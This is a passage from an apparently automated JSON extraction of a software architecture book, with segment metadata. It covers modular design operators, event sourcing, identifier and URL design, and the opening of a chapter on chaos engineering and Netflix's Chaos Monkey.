disruption.\n\nThe second decomposition offers more options. You have more places to exclude or augment.\n\nInversion\n\nInversion works by taking functionality that’s distributed in several modules and raising it up higher in the system. It takes a good solution to a general problem, extracts it, and makes it into a first-class concern.\n\nIn the following figure, several services have their own way of performing A/B tests. This is a feature that each service built...and probably not in a consistent way. This would be a candidate for inversion. In the figure on page 312, you can see that the “experimentation” service is now lifted up to the top level of the system. Individual services don’t need to decide whether to put a user in the control group or the test group. They just need to read a header attached to the request.\n\nApp\n\nAPI\n\nRegister\n\nFeaturedContent\n\nProjectSearch\n\nProposal\n\nA/BtestA/BtestA/Btest\n\nInversion can be powerful. It creates a new dimension for variation and can reveal a business opportunity...like the entire market for operating systems.\n\nreport erratum • discuss\n\nChapter 16. Adaptation • 312\n\nAPI\n\nRegister\n\nFeaturedContent\n\nProjectSearch\n\nProposal\n\nExperimentation\n\nApp\n\nPorting\n\nBaldwin and Clark look at porting in terms of moving hardware or operating system modules from one CPU to another. We can take a more general view. Porting is really about repurposing a module from a different system. Any time we use a service created by a different project or system, we’re “porting” that service to our system, as shown in the following figure.\n\nModule 1\n\nModule 2\n\nModule 3\n\nModule X\n\nSystem 2\n\nModule Y\n\n“ported”module\n\nSystem 1\n\nPorting risks adding coupling, though. It clearly means a new dependency, and if the road map of that service diverges from our needs, then we must make a substitution. In the meantime, though, we may still benefit from using it.\n\nThis is kind of analogous to porting C sources from one operating system to another. The calling sequences may look the same but have subtle differences that cause errors. The new consumer must be careful to exercise the module thoroughly via the same interface that will be used in production. That doesn’t mean the new caller has to replicate all the unit and integration tests that the module itself runs. It’s more that the caller should make sure its own calls work as expected.\n\nAnother way of “porting” a module into our system is through instantiation. We don’t talk about this option very often, but nothing says that a service’s code can only run in a single cluster. If we need to fork the code and deploy a new instance, that’s also a way to bring the service into our system.\n\nreport erratum • discuss\n\nInformation Architecture • 313\n\nBaldwin and Clark argue that these six operators can create any arbitrarily complex structure of modules. They also show that the economic value of the system increases with the number of options—or boundaries—where you can apply these operators.\n\nKeep these operators in your pocket as thinking tools as well. When you look at a set of features, think of three different ways to split them into modules. Think of how you can make modules that allow exclusion or augmentation. See where an inversion might be lurking.\n\nSummary\n\nWe’ve looked at a few ways to build your architecture to make it adaptable:\n\nLoose clusters are a great start.\n\nUse an evolutionary architecture with microservices, messages, microker-\n\nnels, or something that doesn’t start with m.\n\nAsynchrony helps here, just as it helps combat the stability antipatterns.\n\nBe explicit about context so that services can work with many participants\n\ninstead of having an implied connection to just one.\n\nCreate options for the future. Make room to apply the modular operations.\n\nThere’s one last source of inflexibility we need to address. That’s in the way we structure, pass, and refer to data.\n\nInformation Architecture\n\nInformation architecture is how we structure data. It’s the data and metadata we use to describe the things that matter to our systems. We also need to keep in mind that it’s not reality, or even a picture of reality. It’s a set of related models that capture some facets of reality. Our job is to chose which facets to model, what to leave out, and how concrete to be.\n\nWhen you’re embedded in a paradigm, it’s hard to see its limits. Many of us got started in the era of relational databases and object-oriented programming, so we tend to view the world in terms of related objects and their states. Relational databases are good at answering, “What is the value of attribute A on entity E right now?” But they’re somewhat less good at keeping track of the history of attribute A on entity E. They’re pretty awkward with graphs or hierarchies, and they’re downright terrible at images, sound, or video.\n\nOther database models are good at other questions.\n\nreport erratum • discuss\n\nChapter 16. Adaptation • 314\n\nTake the question, “Who wrote Hamlet?” In a relational model, that question has one answer: Shakespeare, William. Your schema might allow coauthors, but it surely wouldn’t allow for the theory that Kit Marlowe wrote Shake- speare’s plays. That’s because the tables in a relational database are meant to represent facts. On the other hand, statements in an RDF triple store are assertions rather than facts. Every statement there comes with an implicit, “Oh yeah, who says?” attached to it.\n\nAnother perspective: In most databases, the act of changing the database is a momentary operation that has no long-lived reality of its own. In a few, however, the event itself is primary. Events are preserved as a journal or log. The notion of the current state is really to say, “What’s the cumulative effect of everything that’s ever happened?”\n\nEach of these embeds a way of modeling the world. Each paradigm defines what you can and cannot express. None of them are the whole reality, but each of them can represent some knowledge about reality.\n\nYour job in building systems is to decide what facets of reality matter to your system, how you are going to represent those, and how that representation can survive over time. You also have to decide what concepts will remain local to an application or service, and what concepts can be shared between them. Sharing concepts increases expressive power, but it also creates coupling that can hinder change.\n\nIn this section, we’ll look at the most important aspects of information architecture as it affects adaptation. This is a small look at a large subject. For much more on the subject, see Foundations of Databases [AHV94] and Data and Reality [Ken98].\n\nMessages, Events, and Commands\n\nIn “What Do You Mean by ’Event-Driven’?”9 Martin Fowler points out the unfortunate overloading of the word “event.” He and his colleagues identified three main ways events are used, plus a fourth term that is often conflated with events:\n\nEvent notification: A fire-and-forget, one-way announcement. No response\n\nis expected or used.\n\nEvent-carried state transfer: An event that replicates entities or parts of\n\nentities so other systems can do their work\n\n9.\n\nhttps://martinfowler.com/articles/201701-event-driven.html\n\nreport erratum • discuss",
      "page_number": 308,
      "chapter_number": 38,
      "summary": "This chapter covers segment 38 (pages 308-316). Key topics include module, services, and dependencies. Classes tend toward a power-law distribution.",
      "keywords": [
        "module",
        "System",
        "service",
        "n’t",
        "System Architecture",
        "cluster",
        "report erratum",
        "Event-based Prefers asynchronous",
        "operating system modules",
        "work",
        "System Module",
        "Event-based Prefers",
        "discuss",
        "erratum",
        "report"
      ],
      "concepts": [
        "module",
        "services",
        "dependencies",
        "depend",
        "dependency",
        "clustering",
        "cluster",
        "instance",
        "work",
        "developer"
      ],
      "similar_chapters": [
        {
          "book": "Microservices Up and Running",
          "chapter": 9,
          "title": "Segment 9 (pages 86-94)",
          "relevance_score": 0.65,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservice Architecture",
          "chapter": 4,
          "title": "Segment 4 (pages 25-32)",
          "relevance_score": 0.6,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservice Architecture",
          "chapter": 13,
          "title": "Segment 13 (pages 98-105)",
          "relevance_score": 0.59,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservices Up and Running",
          "chapter": 30,
          "title": "Segment 30 (pages 296-304)",
          "relevance_score": 0.59,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Machine Learning Systems An Iterative Process for Production-Ready Applications",
          "chapter": 33,
          "title": "Segment 33 (pages 281-289)",
          "relevance_score": 0.58,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 39,
      "title": "Segment 39 (pages 317-324)",
      "start_page": 317,
      "end_page": 324,
      "detection_method": "topic_boundary",
      "content": "Information Architecture • 315\n\nEvent sourcing: When all changes are recorded as events that describe\n\nthe change\n\nCommand-query responsibility segregation (CQRS): Reading and writing with different structures. Not the same as events, but events are often found on the “command” side.\n\nEvent sourcing has gained support thanks to Apache Kafka,10 which is a persistent event bus. It blends the character of a message queue with that of a distributed log. Events stay in the log forever, or at least until you run out of space. With event sourcing, the events themselves become the authoritative record. But since it can be slow to walk through every event in history to figure out the value of attribute A on entity E, we often keep views to make it fast to answer that question. See the following figure for illustration.\n\nt=0\n\nnext event\n\nView A\n\nView B\n\nView C\n\nSnapshot\n\nread index\n\nWith an event journal, several views can each project things in a different way. None of them is more “true” than others. The event journal is the only truth. The others are caches, optimized to answer a particular kind of question. These views may even store their current state in a database of their own, as shown with the “snapshot” in the previous diagram.\n\nVersioning can be a real challenge with events, especially once you have years’ worth of them. Stay away from closed formats like serialized objects. Look toward open formats like JSON or self-describing messages. Avoid frameworks that require code generation based on a schema. Likewise avoid anything that requires you to write a class per message type or use annotation-based\n\n10. http://kafka.apache.org\n\nreport erratum • discuss\n\nChapter 16. Adaptation • 316\n\nmapping. Treat the messages like data instead of objects and you’re going to have a better time supporting very old formats.\n\nYou’ll want to apply some of the versioning principles discussed in Chapter 14, Handling Versions, on page 263. In a sense, a message sender is commu- nicating with a future (possibly not-yet-written) interface. A message reader is receiving a call from the distant past. So data versioning is definitely a concern.\n\nUsing messages definitely brings complexity. People tend to express business requirements in an inherently synchronous way. It requires some creative thinking to transform them to be asynchronous.\n\nServices Control Their Identifiers\n\nSuppose you work for an online retailer and you need to build a “catalog” service. You’ll see in Embrace Plurality, on page 321, that one catalog will never be enough. A catalog service should really handle many catalogs. Given that, how should we identify which catalog goes with which user?\n\nThe first, most obvious approach is to assign an owner to each catalog, as shown in the following figure. When a user wants to access a particular cata- log, the owner ID is included in the request.\n\nCaller\n\nCatalogsService\n\nAdd (POST Owner ID and Item data)\n\nItem URL\n\nQuery (GET on search URL w/owner ID and query params)Results\n\nThis has two problems:\n\n1. The catalog service must couple to one particular authority for users. This means that the caller and the provider have to participate in the same authentication and authorization protocol. That protocol certainly stops at the edge of your organization, so it automatically makes it hard to work with partners. But it also increases the barrier to use of the new service.\n\nreport erratum • discuss\n\nInformation Architecture • 317\n\n2. One owner can only have one catalog. If a consuming application needs more than one catalog, it has to create multiple identities in the authority service (multiple account IDs in Active Directory, for example). We should remove the idea of ownership from the catalog service altogether. It should be happy to create many, many fine catalogs for anyone who wants one. That means the protocol looks more like the next figure. Any user can create a catalog. The catalog service issues an identifier for that specific cat- alog. The user provides that catalog ID on subsequent requests. Of course, a catalog URL is a perfectly adequate identifier.\n\nCatalog URL\n\nCaller\n\nCatalogsService\n\nCreate (POST to Catalogs Service)\n\nAdd (PUT to Catalog URL)\n\nItem URL\n\nQuery (GET on Catalog URL w/query params)Results\n\nIn effect, the catalog service acts like a little standalone SaaS business. It has many customers, and the customers get to decide how they want to use that catalog. Some users will be busy and dynamic. They will change their catalogs all the time. Other users may be limited in time, maybe just building a catalog for a one-time promotion. That’s totally okay. Different users may even have different ownership models.\n\nYou probably still need to ensure that callers are allowed to access a partic- ular catalog. This is especially true when you open the service up to your business partners. As shown in the figure on page 318, a “policy proxy” can map from a client ID (whether that client is internal or external makes no difference) to a catalog ID. This way, questions of ownership and access control can be factored out of the catalog service itself into a more centrally controlled location.\n\nreport erratum • discuss\n\nChapter 16. Adaptation • 318\n\nCallercatalog ID\n\nclient ID\n\nCatalogService\n\nPolicy Proxy\n\nMap fromclient ID to catalog IDclient ID\n\ncatalog ID\n\nServices should issue their own identifiers. Let the caller keep track of own- ership. This makes the service useful in many more contexts.\n\nURL Dualism\n\nWe can use quotation marks when we want to talk about a word, rather than using the word itself. For example, we can say the word “verbose” means “using too many words.” It’s a bit like the difference between a pointer and a value. We understand that the pointer stands in as a way to refer to the value.\n\nURLs have the same duality. A URL is a reference to a representation of a value. You can exchange the URL for that representation by resolving it—just like dereferencing the point. Like a pointer, you can also pass the URL around as an identifier. A program may receive a URL, store it as a text string, and pass it along without ever attempting to resolve it. Or your program might store the URL as an identifier for some thing or person, to be returned later when a caller presents the same URL.\n\nIf we truly make use of this dualism, we can break a lot of dependencies that otherwise seem impossible.\n\nHere’s another example drawn from the world of online retail. A retailer has a spiffy site to display items. The typical way to get the item information is shown in the figure on page 319. An incoming request contains an item ID. The front end looks up that ID in the database, gets the item details, and displays them.\n\nreport erratum • discuss\n\nInformation Architecture • 319\n\nCaller\n\nitemID = “12345”\n\nCatalog\n\nItemsselect * from item where item_id = “12345”\n\nObviously this works. A lot of business gets done with this model! But consider the chain of events when our retailer acquires another brand. Now we have to get all the retailer’s items into our database. That’s usually very hard, so we decide to have the front end look at the item ID and decide which database to hit, as shown in the figure that follows.\n\nCaller\n\nitemID = “ab9876”\n\nCatalog\n\nOld &BustedItemsselect * from hot where id = “9876”\n\nNewHotnessItems\n\n“items like ab* comefrom new hotness”\n\nreport erratum • discuss\n\nChapter 16. Adaptation • 320\n\nThe problem is that we now have exactly two databases of items. In computer systems, “two” is a ridiculous number. The only numbers that make sense are “zero,” “one,” and “many.” We can use URL dualism to support many databases by using URLs as both the item identifier and a resolvable resource. That model is shown in the following figure.\n\ngetURL\n\nCaller\n\nitemID = “http://example.com/new/hot/9876”\n\nCatalog\n\nOld &BustedItems\n\nNewHotnessItems\n\nNew Hotness ItemsService\n\nProxy with Rewrites\n\nOutbound APIGateway\n\nExternalPartner\n\nIt might seem expensive to resolve every URL to a source system on every call. That’s fine; introduce an HTTP cache to reduce latency.\n\nThe beautiful part of this approach is that the front end can now use services that didn’t even exist when it was created. As long as the new service returns a useful representation of that item, it will work.\n\nAnd who says the item details have to be served by a dynamic, database- backed service? If you’re only ever looking these up by URL, feel free to publish static JSON, HTML, or XML documents to a file server. For that matter, nothing says these item representations even have to come from inside your own company. The item URL could point to an outbound API gateway that proxies a request to a supplier or partner.\n\nYou might recognize this as a variation of “Explicit Context.” (See Explicit Context, on page 306.) We use URLs because they carry along the context we need to fetch the underlying representation. It gives us much more flexibility than plugging item ID numbers into a URL template string for a service call.\n\nreport erratum • discuss\n\nInformation Architecture • 321\n\nYou do need to be a bit careful here. Don’t go making requests to any arbitrary URL passed in to you by an external user. See Chapter 11, Security, on page 215, for a shocking array of ways attackers could use that against you. In practice, you need to encrypt URLs that you send out to users. That way you can verify that whatever you receive back is something you generated.\n\nEmbrace Plurality\n\nOne of the basic enterprise architecture patterns is the “Single System of Record.” The idea is that any particular concept should originate in exactly one system, and that system will be the enterprise-wide authority on entities within that concept.\n\nThe hard part is getting all parts of the enterprise to agree on what those concepts actually are.\n\nPick an important noun in your domain, and you’ll find a system that should manage every instance of that noun. Customer, order, account, payment, policy, patient, location, and so on. A noun looks simple. It fools us. Across your organization, you’ll collect several definitions of every noun. For example:\n\nA customer is a company with which we have a contractual relationship.\n\nA customer is someone entitled to call our support line.\n\nA customer is a person who owes us money or has paid us money in\n\nthe past.\n\nA customer is someone I met at a trade show once that might buy some-\n\nthing someday in the future.\n\nSo which is it? The truth is that a customer is all of these things. Bear with me for a minute while I get into some literary theory. Nouns break down. Being a “customer” isn’t the defining trait of a person or company. Nobody wakes up in the morning and says, “I’m happy to be a General Mills cus- tomer!” “Customer” describes one facet of that entity. It’s about how your organization relates to that entity. To your sales team, a customer is someone who might someday sign another contract. To your support organization, a customer is someone who is allowed to raise a ticket. To your accounting group, a customer is defined by a commercial relationship. Each of those groups is interested in different attributes of the customer. Each applies a different life cycle to the idea of what a customer is. Your support team doesn’t want its “search by name” results cluttered up with every prospect your sales team ever pursued. Even the question, “Who is allowed to create a customer instance?” will vary.\n\nreport erratum • discuss\n\nChapter 16. Adaptation • 322\n\nThis challenge was the bane of enterprise-wide shared object libraries, and it’s now the bane of enterprise-wide shared services.\n\nAs if those problems weren’t enough, there’s also the “dark matter” issue. A system of record must pick a model for its entities. Anything that doesn’t fit the model can’t be represented there. Either it’ll go into a different (possibly covert) database or it just won’t be represented anywhere.\n\nInstead of creating a single system of record for any given concept, we should think in terms of federated zones of authority. We allow different systems to own their own data, but we emphasize interchange via common formats and representations. Think of this like duck-typing for the enterprise. If you can exchange a URL for a representation that you can use like a customer, then as far as you care, it is a customer service, whether the data came from a database or a static file.\n\nAvoid Concept Leakage\n\nAn electronics retailer was late to the digital music party. But it wanted to start selling tracks on its website. The project presented many challenges to its data model. One of the tough nuts was about pricing. The company’s existing systems were set up to price every item individually. But with digital music, the company wanted the ability to price and reprice items in very large groups. Hundreds of thousands of tracks might go from $0.99 to $0.89 overnight. None of its product management or merchandising tools could handle that.\n\nSomeone created a concept of a “price point” as an entity for the product management database. That way, every track record could have a field for its specific price point. Then all the merchant would need to do is change the “amount” field on the price point and all related tracks would be repriced.\n\nThis was an elegant solution that directly matched the users’ conceptual model of pricing these new digital tracks. The tough question came when we started talking about all the other downstream systems that would need to receive a feed of the price points.\n\nUntil this time, items had prices. The basic customer-visible concepts of cat- egory, product, and item were very well established. The internal hierarchy of department, class, and subclass were also well understood. Essentially every system that received item data also received these other concepts.\n\nBut would they all need to receive the “price point” data as well?\n\nreport erratum • discuss",
      "page_number": 317,
      "chapter_number": 39,
      "summary": "This chapter covers segment 39 (pages 317-324). Key topics include event, services, and messages. That’s in the way we structure, pass, and refer to data.",
      "keywords": [
        "Baldwin and Clark",
        "catalog",
        "URL",
        "catalog URL",
        "catalog service",
        "Item URL Query",
        "Catalog URL Caller",
        "service",
        "Information Architecture",
        "Item",
        "Item URL",
        "Clark argue",
        "event",
        "Architecture",
        "report erratum"
      ],
      "concepts": [
        "event",
        "services",
        "messages",
        "url",
        "urls",
        "catalog",
        "ids",
        "item",
        "make",
        "caller"
      ],
      "similar_chapters": [
        {
          "book": "Microservice APIs Using Python Flask FastAPI",
          "chapter": 15,
          "title": "Segment 15 (pages 136-143)",
          "relevance_score": 0.7,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservices Up and Running",
          "chapter": 6,
          "title": "Segment 6 (pages 59-67)",
          "relevance_score": 0.64,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 59,
          "title": "Segment 59 (pages 583-590)",
          "relevance_score": 0.63,
          "method": "sentence_transformers"
        },
        {
          "book": "AI Agents and Applications",
          "chapter": 15,
          "title": "Segment 15 (pages 120-128)",
          "relevance_score": 0.62,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 2,
          "title": "Segment 2 (pages 9-17)",
          "relevance_score": 0.62,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 40,
      "title": "Segment 40 (pages 325-333)",
      "start_page": 325,
      "end_page": 333,
      "detection_method": "topic_boundary",
      "content": "Information Architecture • 323\n\nIntroducing price point as a global concept across the retailer’s entire constel- lation of systems was a massive change. The ripple effect would be felt for years. Coordinating all the releases needed to introduce that concept would make Rube Goldberg shake his head in sadness. But it looked like that was required because every other system certainly needed to know what price to display, charge, or account for on the tracks.\n\nBut price point was not a concept that other systems needed for their own purposes. They just needed it because the item data was now incomplete thanks to an upstream data model change.\n\nThat was a concept leaking out across the enterprise. Price point was a concept the upstream system needed for leverage. It was a way to let the humans deal with complexity in that product master database. To every system downstream it was incidental complexity. The retailer would’ve been just as well served if the upstream system flattened out the price attribute onto the items when it published them.\n\nThere’s no such thing as a natural data model, there are only choices we make about how to represent things, relationships, and change over time. We need to be careful about exposing internal concepts to other systems. It creates semantic and operational coupling that hinders future change.\n\nSummary\n\nWe don’t capture reality, we only model some aspects of it. There’s no such thing as a “natural” data model, only choices that we make. Every paradigm for modeling data makes some statements easy, others difficult, and others impossible. It’s important to make deliberate choices about when to use relational, document, graph, key-value, or temporal databases.\n\nWe always need to think about whether we should record the new state or the change that caused the new state. Traditionally, we built systems to hold the current state because there just wasn’t enough disk space in the world. That’s not our problem today!\n\nUse and abuse of identifiers causes lots of unnecessary coupling between systems. We can invert the relationship by making our service issue identifiers rather than receiving an “owner ID.” And we can take advantage of the dual nature of URLs to both act like an opaque token or an address we can deref- erence to get an entity.\n\nFinally, we must be careful about exposing concepts to other systems. We may be forcing them to deal with more structure and logic than they need.\n\nreport erratum • discuss\n\nChapter 16. Adaptation • 324\n\nWrapping Up\n\nChange is the defining characteristic of software. That change—that adaptation —begins with release. Release is the beginning of the software’s true life; everything before that release is gestation. Either systems grow over time, adapting to their changing environment, or they decay until their costs out- weigh their benefits and then die.\n\nWe can make change cost less and hurt less by planning for releases to pro- duction as an integral part of our software. That’s in contrast to designing for change inside the software but disregarding the act of making that change live in production.\n\nreport erratum • discuss\n\nCHAPTER 17\n\nChaos Engineering\n\nImagine a conversation that starts like this:\n\n“Hey boss, I’m going to log into production and kill some boxes. Just a few here and there. Shouldn’t hurt anything,” you say.\n\nHow do you think the rest of that conversation will go? It might end up with a visit from Human Resources and an order to clean out your desk. Maybe even a visit to the local psychiatric facility! Killing instances turns out to be a radical idea—but not a crazy one. It’s one technique in an emerging discipline called “chaos engineering.”\n\nBreaking Things to Make Them Better\n\nAccording to the principles of chaos engineering,1 chaos engineering is “the discipline of experimenting on a distributed system in order to build confi- dence in the system’s capability to withstand turbulent conditions in pro- duction.” That means it’s empirical rather than formal. We don’t use models to understand what the system should do. We run experiments to learn what it does.\n\nChaos engineering deals with distributed systems, frequently large-scale systems. Staging or QA environments aren’t much of a guide to the large- scale behavior of systems in production. In Scaling Effects, on page 71, we saw how different ratios of instances can cause qualitatively different behavior in production. That also applies to traffic. Congested networks behave in a qualitatively different way than uncongested ones. Systems that work fine in a low-latency, low-loss network may break badly in a congested network. We also have to think about the economics of staging environments. They’re never going to be full-size replicas of production. Are you going to build a\n\n1.\n\nhttp://principlesofchaos.org\n\nreport erratum • discuss\n\nChapter 17. Chaos Engineering • 326\n\nsecond Facebook as the staging version of Facebook? Of course not. This all makes it hard to gain understanding of a whole system from a non-production environment.\n\nWhy all the emphasis on the full system? Many problems only reveal them- selves in the whole system (for example, excessive retries leading to timeouts, cascading failures, dogpiles, slow responses, and single points of failure, to name a few).\n\nWe can’t simulate these in a nonproduction environment because of the scale problem. We also can’t gain confidence by testing components in isolation. It turns out that like concurrency, safety is not a composable property. Two services may each be safe on their own, but the composition of them isn’t necessarily safe. For example, consider the system in the following figure. The client enforces a 50-millisecond timeout on its calls. Each of the providers has the response time distribution shown: an average of 20 milliseconds, but an observed 99.9 percentile of 30 milliseconds.\n\nProvider 2\n\nClient\n\nProvider 1\n\nResponsetime distribution\n\n20ms\n\n40ms\n\nResponsetime distribution\n\n20ms\n\n40ms\n\nTimeout: 50 ms\n\nThe client can call either of the services with high confidence. But suppose it needs to call both of them in sequence. On average, the two calls will still meet the 50-millisecond time budget. A sizable percentage of calls are going to break that window, though. The client now looks unreliable. This is why chaos engineering emphasizes the whole-system perspective. It deals with emergent properties that can’t be observed in the individual components.\n\nAntecedents of Chaos Engineering\n\nChaos engineering draws from many other fields related to safety, reliability, and control, such as cybernetics, complex adaptive systems, and the study of high-reliability organizations. In particular, the multidisciplinary field of resilience engineering offers a rich area to explore for new directions in chaos.2\n\n2.\n\nhttps://www.kitchensoap.com/2011/04/07/resilience-engineering-part-i\n\nreport erratum • discuss\n\nAntecedents of Chaos Engineering • 327\n\nLimit ofSafety\n\nLimit ofEconomy\n\nLimit ofCapacity\n\nDrift over time\n\nSafetyBarrier\n\nIn Drift into Failure [Sid11] Sidney Dekker, one of the pioneers in resilience engineer- ing, talks about “drift” as a phenomenon. A system exists in a realm with three key boundaries, as shown in the figure. (In this context, when Dekker talks about systems, he means the whole collection of people, technology, and processes, not just the information systems.) Over time, there’s pressure to increase the economic return of the system. Human nature also means people don’t want to work at the upper limit of possible productivity. Those forces combine to create a gradient that pushes the whole system closer to the safety boundary and the barriers we create to prevent disasters.\n\nDekker illustrates this idea using an airliner as an example. Jet aircraft can fly faster at higher altitudes (subject to a trade-off in fuel efficiency). Faster trips mean more turnarounds on the aircraft and thus greater revenue via carrying more passengers. However, at the optimum flight altitude for revenue, the range between the aircraft’s stall speed and the speed where the flight surfaces create turbulence are much closer together than where the air is thicker. Consequently, there’s less room for error at the economically optimum altitude.\n\nWe can see the same effect in a distributed system (using system in our usual sense here). In the absence of other forces, we will optimize the system for maximum gain. We’ll push throughput up to the limit of what the machines and network can bear. The system will be maximally utilized and maximally profitable...right up until the time a disruption occurs.\n\nHighly efficient systems handle disruption badly. They tend to break all at once.\n\nChaos engineering provides that balancing force. It springs from the view that says we need to optimize our systems for availability and tolerance to disrup- tion in a hostile, turbulent world rather than aiming for throughput in an idealized environment.\n\nAnother thread that led to chaos engineering has to do with the challenge of measuring events that don’t happen. In General Principles of Systems Design [Wei88], Gerald Weinberg describes the “fundamental regulator paradox” (where regulator is used in the sense of a feedback and control component, not in a governmental context):\n\nreport erratum • discuss\n\nChapter 17. Chaos Engineering • 328\n\nThe task of a regulator is to eliminate variation, but this variation is the ultimate source of information about the quality of its work. Therefore, the better job a regulator does, the less information it gets about how to improve.\n\nThis was once paraphrased as, “You don’t know how much you depend on your IT staff until they go on vacation.”\n\nA related paradox is the “Volkswagen microbus” paradox: You learn how to fix the things that often break. You don’t learn how to fix the things that rarely break. But that means when they do break, the situation is likely to be more dire. We want a continuous low level of breakage to make sure our system can handle the big things.\n\nFinally, Nassim Taleb’s Antifragile [Tal12] describes systems that improve from stresses. Distributed information systems don’t naturally fall into that category! In fact, we expect that disorder will occur, but we want to make sure there’s enough of it during normal operation that our systems aren’t flummoxed when it does occur. We use chaos engineering the way a weightlifter uses iron: to create tolerable levels of stress and breakage to increase the strength of the system over time.\n\nThe Simian Army\n\nProbably the best known example of chaos engineering is Netflix’s “Chaos Monkey.” Every once in a while, the monkey wakes up, picks an autoscaling cluster, and kills one of its instances. The cluster should recover automatically. If it doesn’t, then there’s a problem and the team that owns the service has to fix it.\n\nThe Chaos Monkey tool was born during Netflix’s migration to Amazon’s AWS cloud infrastructure and a microservice architecture. As services proliferated, engineers found that availability could be jeopardized by an increasing number of components. Unless they found a way to make the whole service immune to component failures, they would be doomed. So every cluster needed to autoscale and recover from failure of any instance. But how can you make sure that every deployment of every cluster stays robust when hidden coupling is so easy to introduce?\n\nThe company’s choice was not an “either/or” between making components more robust versus making the whole system more robust. It was an “and.” They would use stability patterns to make individual instances more likely to survive. But there’s no amount of code you can put into an instance that keeps AWS from terminating the instance! Instances in AWS get terminated just often enough to be a big problem as you scale, but not so often that every\n\nreport erratum • discuss\n\nAdopting Your Own Monkey • 329\n\ndeployment of every service would get tested. Basically, Netflix needed failures to happen more often so that they became totally routine. (This is an example of the agile adage, “If something hurts, do it more often.”)\n\nOther monkeys have followed: Latency Monkey, Janitor Monkey, Conformity Monkey, and even Chaos Kong. Netflix has made the “Simian Army” open source.3 From this, the company has learned every new kind of monkey it creates improves its overall availability. Second, as noted by Heather Nakama at the third Chaos Community Day, people really like the word “monkey.”\n\nOpt In or Opt Out?\n\nAt Netflix, chaos is an opt-out process. That means every service in production will be subject to Chaos Monkey. A service owner can get a waiver, but it requires sign-off. That isn’t just a paper process...exempt services go in a database that Chaos Monkey consults. Being exempt carries a stigma. Engi- neering management reviews the list periodically and prods service owners to fix their stuff.\n\nOther companies adopting chaos engineering have chosen an opt-in approach. Adoption rates are much lower in opt-in environments than in opt-out. However, that may be the only feasible approach for a mature, entrenched architecture. There may simply be too much fragility to start running chaos tests everywhere.\n\nWhen you’re adding chaos to an organization, consider starting with opting in. That will create much less resistance and allow you to publicize some success stories before moving to an opt-out model. Also, if you start with opt- out, people might not fully understand what they’re opting out from. Or rather, they might not realize how serious it could be if they don’t respond to the opt- out but should have!\n\nAdopting Your Own Monkey\n\nWhen Chaos Monkey launched, most developers were surprised by how many vulnerabilities it uncovered. Even services that had been in production for ages turned out to have subtle configuration problems. Some of them had cluster membership rosters that grew without bounds. Old IP addresses would stay on the list, even though the owner would never be seen again. (Or worse, if that IP came back it was as a different service!)\n\n3.\n\nhttp://netflix.github.io\n\nreport erratum • discuss\n\nChapter 17. Chaos Engineering • 330\n\nPrerequisites\n\nFirst of all, your chaos engineering efforts can’t kill your company or your customers.\n\nIn a sense, Netflix had it easy. Customers are familiar with pressing the play button again if it doesn’t work the first time. They’ll forgive just about anything except cutting off the end of Stranger Things. If every single request in your system is irreplaceably valuable, then chaos engineering is not the right approach for you. The whole point of chaos engineering is to disrupt things in order to learn how the system breaks. You must be able to break the system without breaking the bank!\n\nYou also want a way to limit the exposure of a chaos test. Some people talk about the “blast radius”...meaning the magnitude of bad experiences both in terms of the sheer number of customers affected and the degree to which they’re disrupted. To keep the blast radius under control, you often want to pick “victims” based on a set of criteria. It may be as simple as “every 10,000th request will fail” when you get started, but you’ll soon need more sophisticated selections and controls.\n\nYou’ll need a way to track a user and a request through the tiers of your system, and a way to tell if the whole request was ultimately successful or not. That trace serves two purposes. If the request succeeds, then you’ve uncovered some redundancy or robustness in the system. The trace will tell you where the redundancy saves the request. If the request fails, the trace will show you where that happened, too.\n\nYou also have to know what “healthy” looks like, and from what perspective. Is your monitoring good enough to tell when failure rates go from 0.01 percent to 0.02 percent for users in Europe but not in South America? Be wary that measurements may fail when things get weird, especially if monitoring shares the same network infrastructure as production traffic. Also, as Charity Majors, CEO of Honeycomb.io says, “If you have a wall full of green dashboards, that means your monitoring tools aren’t good enough.” There’s always something weird going on.\n\nFinally, make sure you have a recovery plan. The system may not automat- ically return to a healthy state when you turn off the chaos. So you will need to know what to restart, disconnect, or otherwise clean up when the test is done.\n\nreport erratum • discuss\n\nAdopting Your Own Monkey • 331\n\nDesigning the Experiment\n\nLet’s say you’ve got great measurements in place. Your A/B testing system can tag a request as part of a control group or a test group. It’s not quite time to randomly kill some boxes yet. First you need to design the experiment, beginning with a hypothesis.\n\nThe hypothesis behind Chaos Monkey was, “Clustered services should be unaffected by instance failures.” Observations quickly invalidated that hypothesis. Another hypothesis might be, “The application is responsive even under high latency conditions.”\n\nAs you form the hypothesis, think about it in terms of invariants that you expect the system to uphold even under turbulent conditions. Focus on externally observable behavior, not internals. There should be some healthy steady state that the system maintains as a whole.\n\nOnce you have a hypothesis, check to see if you can even tell if the steady state holds now. You might need to go back and tweak measurements. Look for blind spots like a hidden delay in network switches or a lost trace between legacy applications.\n\nNow think about what evidence would cause you to reject the hypothesis. Is a non-zero failure rate on a request type sufficient? Maybe not. If that request starts outside your organization, you probably have some failures due to external network conditions (aborted connections on mobile devices, for example). You might have to dust off those statistics textbooks to see how large a change constitutes sufficient evidence.\n\nInjecting Chaos\n\nThe next step is to apply your knowledge of the system to inject chaos. You know the structure of the system well enough to guess where you can kill an instance, add some latency, or make a service call fail. These are all “injec- tions.” Chaos Monkey does one kind of injection: it kills instances.\n\nKilling instances is the most basic and crude kind of injection. It will abso- lutely find weaknesses in your system, but it’s not the end of the story.\n\nLatency Monkey adds latency to calls. This strategy finds two additional kinds of weaknesses. First, some services just time out and report errors when they should have a useful fallback. Second, some services have undetected race conditions that only become apparent when responses arrive in a different order than usual.\n\nreport erratum • discuss",
      "page_number": 325,
      "chapter_number": 40,
      "summary": "This chapter covers segment 40 (pages 325-333). Key topics include systems, monkey, and engineering.",
      "keywords": [
        "Chaos Engineering",
        "System",
        "Chaos",
        "Chaos Monkey",
        "n’t",
        "Customer",
        "Engineering",
        "Monkey",
        "price point",
        "report erratum",
        "price",
        "make",
        "concept",
        "change",
        "data"
      ],
